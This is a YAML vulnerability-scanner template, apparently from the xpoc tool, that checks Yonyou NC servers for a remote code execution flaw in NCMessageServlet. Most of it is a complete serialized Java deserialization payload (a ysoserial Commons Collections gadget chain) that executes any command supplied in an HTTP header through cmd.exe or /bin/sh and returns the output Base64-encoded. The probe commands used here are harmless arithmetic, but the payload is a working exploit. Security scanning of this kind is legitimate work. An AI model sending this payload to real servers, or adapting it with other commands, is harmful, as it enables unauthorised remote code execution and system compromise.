id: yonyou-nc-ncmessageservlet-rce

info:
  name: Yonyou NC messages servlet RCE
  author: xpoc
  severity: critical
  verified: false
  tags: yonyou,rce
  created: 2023/06/23

set:
  rInt1: randomInt(800000000, 1000000000)
  rInt2: randomInt(800000000, 1000000000)
  rb: >-
    b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\fw\b\x00\x00\x00\x10\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x00sr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\afactoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x02sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x007com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00>org.apache.commons.collections.functors.InstantiateTransformer4\x8b\xf4\x7f\xa4\x86\xd0;\x02\x00\x02[\x00\x05iArgst\x00\x13[Ljava/lang/Object;[\x00\viParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x01sr\x00)org.apache.xalan.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\aI\x00\r_indentNumberI\x00\x0e_transletIndexL\x00\v_auxClassest\x00*Lorg/apache/xalan/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classq\x00~\x00\x15L\x00\x05_namet\x00\x12Ljava/lang/String;L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\bT\xe0\x02\x00\x00xp\x00\x00\x0e\xf1\xca\xfe\xba\xbe\x00\x00\x002\x00\xe3\n\x00\x03\x00\x0f\a\x00\xde\a\x00\x12\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x13StubTransletPayload\x01\x00\fInnerClasses\x01\x005Lysoserial/payloads/util/Gadgets$StubTransletPayload;\x01\x00\nSourceFile\x01\x00\fGadgets.java\f\x00\x04\x00\x05\a\x00\x13\x01\x003ysoserial/payloads/util/Gadgets$StubTransletPayload\x01\x00\x10java/lang/Object\x01\x00\x1fysoserial/payloads/util/Gadgets\x01\x00\b<clinit>\x01\x00\x10java/lang/Thread\a\x00\x15\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\f\x00\x17\x00\x18\n\x00\x16\x00\x19\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\f\x00\x1b\x00\x1c\n\x00\x16\x00\x1d\x01\x00\bgetClass\x01\x00\x13()Ljava/lang/Class;\f\x00\x1f\x00 \n\x00\x03\x00!\x01\x00\athreads\b\x00#\x01\x00\x0fjava/lang/Class\a\x00%\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\f\x00'\x00(\n\x00&\x00)\x01\x00\"java/lang/reflect/AccessibleObject\a\x00+\x01\x00\rsetAccessible\x01\x00\x04(Z)V\f\x00-\x00.\n\x00,\x00/\x01\x00\x17java/lang/reflect/Field\a\x001\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\f\x003\x004\n\x002\x005\x01\x00\x13[Ljava/lang/Thread;\a\x007\x01\x00\agetName\x01\x00\x14()Ljava/lang/String;\f\x009\x00:\n\x00\x16\x00;\x01\x00\x04exec\b\x00=\x01\x00\x10java/lang/String\a\x00?\x01\x00\bcontains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\f\x00A\x00B\n\x00@\x00C\x01\x00\x04http\b\x00E\x01\x00\x06target\b\x00G\x01\x00\x12java/lang/Runnable\a\x00I\x01\x00\x06this$0\b\x00K\x01\x00\ahandler\b\x00M\x01\x00\x1ejava/lang/NoSuchFieldException\a\x00O\x01\x00\rgetSuperclass\f\x00Q\x00 \n\x00&\x00R\x01\x00\x06global\b\x00T\x01\x00\nprocessors\b\x00V\x01\x00\x0ejava/util/List\a\x00X\x01\x00\x04size\x01\x00\x03()I\f\x00Z\x00[\v\x00Y\x00\\\x01\x00\x15(I)Ljava/lang/Object;\f\x003\x00^\v\x00Y\x00_\x01\x00\x03req\b\x00a\x01\x00\vgetResponse\b\x00c\x01\x00\tgetMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\f\x00e\x00f\n\x00&\x00g\x01\x00\x18java/lang/reflect/Method\a\x00i\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\f\x00k\x00l\n\x00j\x00m\x01\x00\tgetHeader\b\x00o\x01\x00\fX-T0KEN-INF0\b\x00q\x01\x00\aisEmpty\x01\x00\x03()Z\f\x00s\x00t\n\x00@\x00u\x01\x00\tsetStatus\b\x00w\x01\x00\x11java/lang/Integer\a\x00y\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\f\x00{\x00|\t\x00z\x00}\x01\x00\x04(I)V\f\x00\x04\x00\x7f\n\x00z\x00\x80\x01\x00\aos.name\b\x00\x82\x01\x00\x10java/lang/System\a\x00\x84\x01\x00\vgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\f\x00\x86\x00\x87\n\x00\x85\x00\x88\x01\x00\vtoLowerCase\f\x00\x8a\x00:\n\x00@\x00\x8b\x01\x00\x06window\b\x00\x8d\x01\x00\acmd.exe\b\x00\x8f\x01\x00\x02/c\b\x00\x91\x01\x00\a/bin/sh\b\x00\x93\x01\x00\x02-c\b\x00\x95\x01\x00\x11java/util/Scanner\a\x00\x97\x01\x00\x18java/lang/ProcessBuilder\a\x00\x99\x01\x00\x16([Ljava/lang/String;)V\f\x00\x04\x00\x9b\n\x00\x9a\x00\x9c\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\f\x00\x9e\x00\x9f\n\x00\x9a\x00\xa0\x01\x00\x11java/lang/Process\a\x00\xa2\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\f\x00\xa4\x00\xa5\n\x00\xa3\x00\xa6\x01\x00\x18(Ljava/io/InputStream;)V\f\x00\x04\x00\xa8\n\x00\x98\x00\xa9\x01\x00\x02\\A\b\x00\xab\x01\x00\fuseDelimiter\x01\x00'(Ljava/lang/String;)Ljava/util/Scanner;\f\x00\xad\x00\xae\n\x00\x98\x00\xaf\x01\x00\x04next\f\x00\xb1\x00:\n\x00\x98\x00\xb2\x01\x00\bgetBytes\x01\x00\x04()[B\f\x00\xb4\x00\xb5\n\x00@\x00\xb6\x01\x00*org.apache.tomcat.util.codec.binary.Base64\b\x00\xb8\x01\x00\aforName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\f\x00\xba\x00\xbb\n\x00&\x00\xbc\x01\x00\fencodeBase64\b\x00\xbe\x01\x00\x02[B\a\x00\xc0\x01\x00\tsetHeader\b\x00\xc2\x01\x00\aX-T0KEN\b\x00\xc4\x01\x00\x15(Ljava/lang/String;)V\f\x00\x04\x00\xc6\n\x00@\x00\xc7\x01\x00\x05([B)V\f\x00\x04\x00\xc9\n\x00@\x00\xca\x01\x00\x1fjava/lang/NoSuchMethodException\a\x00\xcc\x01\x00\x13java.nio.ByteBuffer\b\x00\xce\x01\x00\x04wrap\b\x00\xd0\x01\x00\x11getDeclaredMethod\f\x00\xd2\x00f\n\x00&\x00\xd3\x01\x00\adoWrite\b\x00\xd5\x01\x00\x13java/lang/Exception\a\x00\xd7\x01\x00\x15java/lang/ThreadGroup\a\x00\xd9\x01\x00\x13[Ljava/lang/String;\a\x00\xdb\x01\x00\rStackMapTable\x01\x00\x1fysoserial/Pwner2257901125237424\x01\x00!Lysoserial/Pwner2257901125237424;\x01\x00/org/apache/xalan/xsltc/runtime/AbstractTranslet\a\x00\xe0\n\x00\xe1\x00\x0f\x00!\x00\x02\x00\xe1\x00\x00\x00\x00\x00\x02\x00\x01\x00\x04\x00\x05\x00\x01\x00\x06\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\xe2\xb1\x00\x00\x00\x02\x00\a\x00\x00\x00\x06\x00\x01\x00\x00\x005\x00\b\x00\x00\x00\f\x00\x01\x00\x00\x00\x05\x00\t\x00\xdf\x00\x00\x00\b\x00\x14\x00\x05\x00\x01\x00\x06\x00\x00\x04:\x00\n\x00\x19\x00\x00\x03\x1b\xa7\x00\x03\x01L\x03=\xb8\x00\x1a\xb6\x00\x1eN-\xb6\x00\"\x12$\xb6\x00*:\x04\x19\x04\x04\xb6\x000\x19\x04-\xb6\x006\xc0\x008:\x05\x036\x06\x15\x06\x19\x05\xbe\xa2\x02\xe0\x19\x05\x15\x062:\a\x19\a\x01\xa6\x00\x06\xa7\x02\xca\x19\a\xb6\x00<:\b\x19\b\x12>\xb6\x00D\x9a\x00\r\x19\b\x12F\xb6\x00D\x9a\x00\x06\xa7\x02\xac\x19\a\xb6\x00\"\x12H\xb6\x00*:\x04\x19\x04\x04\xb6\x000\x19\x04\x19\a\xb6\x006:\t\x19\t\xc1\x00J\x9a\x00\x06\xa7\x02\x86\x19\t\xb6\x00\"\x12L\xb6\x00*:\x04\x19\x04\x04\xb6\x000\x19\x04\x19\t\xb6\x006:\t\x19\t\xb6\x00\"\x12N\xb6\x00*:\x04\xa7\x00\x1a:\n\x19\t\xb6\x00\"\xb6\x00S\xb6\x00S\x12N\xb6\x00*:\x04\xa7\x00\x03\x19\x04\x04\xb6\x000\x19\x04\x19\t\xb6\x006:\t\x19\t\xb6\x00\"\xb6\x00S\x12U\xb6\x00*:\x04\xa7\x00\x14:\v\x19\t\xb6\x00\"\x12U\xb6\x00*:\x04\xa7\x00\x03\x19\x04\x04\xb6\x000\x19\x04\x19\t\xb6\x006:\t\x19\t\xb6\x00\"\x12W\xb6\x00*:\x04\x19\x04\x04\xb6\x000\x19\x04\x19\t\xb6\x006\xc0\x00Y:\f\x036\r\x15\r\x19\f\xb9\x00]\x01\x00\xa2\x01\xc5\x19\f\x15\r\xb9\x00`\x02\x00:\x0e\x19\x0e\xb6\x00\"\x12b\xb6\x00*:\x04\x19\x04\x04\xb6\x000\x19\x04\x19\x0e\xb6\x006:\x0f\x19\x0f\xb6\x00\"\x12d\x03\xbd\x00&\xb6\x00h\x19\x0f\x03\xbd\x00\x03\xb6\x00n:\x10\x19\x0f\xb6\x00\"\x12p\x04\xbd\x00&Y\x03\x12@S\xb6\x00h\x19\x0f\x04\xbd\x00\x03Y\x03\x12rS\xb6\x00n\xc0\x00@:\b\x19\b\x01\xa5\x00\v\x19\b\xb6\x00v\x99\x00\x06\xa7\x01B\x19\x10\xb6\x00\"\x12x\x04\xbd\x00&Y\x03\xb2\x00~S\xb6\x00h\x19\x10\x04\xbd\x00\x03Y\x03\xbb\x00zY\x11\x00\xc8\xb7\x00\x81S\xb6\x00nW\x12\x83\xb8\x00\x89\xb6\x00\x8c\x12\x8e\xb6\x00D\x99\x00\x19\x06\xbd\x00@Y\x03\x12\x90SY\x04\x12\x92SY\x05\x19\bS\xa7\x00\x16\x06\xbd\x00@Y\x03\x12\x94SY\x04\x12\x96SY\x05\x19\bS:\x11\xbb\x00\x98Y\xbb\x00\x9aY\x19\x11\xb7\x00\x9d\xb6\x00\xa1\xb6\x00\xa7\xb7\x00\xaa\x12\xac\xb6\x00\xb0\xb6\x00\xb3\xb6\x00\xb7:\x12\x12\xb9\xb8\x00\xbd:\x13\x19\x13\x12\xbf\x04\xbd\x00&Y\x03\x12\xc1S\xb6\x00h\x01\x04\xbd\x00\x03Y\x03\x19\x12S\xb6\x00n:\x14\x19\x10\xb6\x00\"\x12\xc3\x05\xbd\x00&Y\x03\x12@SY\x04\x12@S\xb6\x00h\x19\x10\x05\xbd\x00\x03Y\x03\xbb\x00@Y\x12\xc5\xb7\x00\xc8SY\x04\xbb\x00@Y\x19\x14\xc0\x00\xc1\xb7\x00\xcbS\xb6\x00nW\xa7\x00Q:\x15\x12\xcf\xb8\x00\xbd:\x16\x19\x16\x12\xd1\x04\xbd\x00&Y\x03\x12\xc1S\xb6\x00\xd4\x19\x16\x04\xbd\x00\x03Y\x03\x19\x12S\xb6\x00n:\t\x19\x10\xb6\x00\"\x12\xd6\x04\xbd\x00&Y\x03\x19\x16S\xb6\x00h\x19\x10\x04\xbd\x00\x03Y\x03\x19\tS\xb6\x00nW\xa7\x00\x03\x04=\x1c\x99\x00\x06\xa7\x00\t\x84\r\x01\xa7\xfe5\x1c\x99\x00\x06\xa7\x00\x14\xa7\x00\v:\x17\xa7\x00\x06\xa7\x00\x00\x84\x06\x01\xa7\xfd\x1e\xa7\x00\b:\x18\xa7\x00\x03\xb1\x00\x05\x00\xa4\x00\xb0\x00\xb3\x00P\x00\xd9\x00\xe8\x00\xeb\x00P\x027\x02\x9a\x02\x9d\x00\xcd\x005\x03\x01\x03\x04\x00\xd8\x00\x05\x03\x12\x03\x15\x00\xd8\x00\x01\x00\xdd\x00\x00\x00\xe5\x00\x1b\x03\xff\x00)\x00\a\x00\x05\x01\a\x00\xda\a\x002\a\x008\x01\x00\x00\xfc\x00\x17\a\x00\x16\xfc\x00\x1a\a\x00@\x02\xfc\x00%\a\x00\x03i\a\x00P\x16`\a\x00P\x10\xff\x00/\x00\x0e\x00\x05\x01\a\x00\xda\a\x002\a\x008\x01\a\x00\x16\a\x00@\a\x00\x03\x00\x00\a\x00Y\x01\x00\x00\xfe\x00~\a\x00\x03\a\x00\x03\a\x00\x03\x02\xfb\x00PR\a\x00\xdc\xff\x00\x8a\x00\x13\x00\x05\x01\a\x00\xda\a\x002\a\x008\x01\a\x00\x16\a\x00@\a\x00\x03\x00\x00\a\x00Y\x01\a\x00\x03\a\x00\x03\a\x00\x03\a\x00\xdc\a\x00\xc1\x00\x01\a\x00\xcd\xfb\x00M\xf9\x00\x01\x06\xf8\x00\x05\x06\xff\x00\x02\x00\a\x00\x05\x01\a\x00\xda\a\x002\a\x008\x01\x00\x01\a\x00\xd8\x04\xff\x00\x02\x00\a\x00\x05\x01\a\x00\xda\a\x002\a\x008\x01\x00\x00\x05\xff\x00\x02\x00\x02\x00\x05\x00\x01\a\x00\xd8\x04\x00\x02\x00\r\x00\x00\x00\x02\x00\x0e\x00\v\x00\x00\x00\n\x00\x01\x00\x02\x00\x10\x00\n\x00\tpt\x00\x04Pwnrpw\x01\x00xur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x01vr\x00\x1djavax.xml.transform.Templates\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsq\x00~\x00\x00?@\x00\x00\x00\x00\x00\x00w\b\x00\x00\x00\x10\x00\x00\x00\x00xxq\x00~\x00\x06x"
rules:
  r0:
    request:
      method: POST
      path: /servlet/~baseapp/nc.message.bs.NCMessageServlet
      headers:
        Content-Type: multipart/form-data;
        X-T0KEN-INF0: set /A {{rInt1}}+{{rInt2}}
      body: '{{rb}}'
    expression: >-
      "X-T0KEN" in response.headers &&
      response.headers["X-T0KEN"].contains(base64(string(rInt1 + rInt2)))
  r1:
    request:
      method: POST
      path: /servlet/~baseapp/nc.message.bs.NCMessageServlet
      headers:
        Content-Type: multipart/form-data;
        X-T0KEN-INF0: expr {{rInt1}}+{{rInt2}}
      body: '{{rb}}'
    expression: >-
      "X-T0KEN" in response.headers &&
      response.headers["X-T0KEN"].contains(base64(string(rInt1 + rInt2)))
expression: r0() || r1()